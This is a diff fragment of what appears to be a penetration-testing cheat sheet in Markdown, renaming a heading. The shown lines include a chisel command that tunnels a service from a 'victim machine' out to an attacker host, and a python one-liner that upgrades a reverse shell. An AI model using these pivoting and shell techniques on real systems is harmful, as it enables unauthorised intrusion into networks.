@@ -30,7 +30,7 @@ Then, on the docker, redirect to your host from the victim machine :
 ./chisel client 10.10.16.8:8000 R:127.0.0.1:8890:172.17.0.1:3000
 ```
 Then you can access the service with http://localhost:8890/.
-## Get a proper shell on RCE
+## Get a proper shell on reverse shell
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
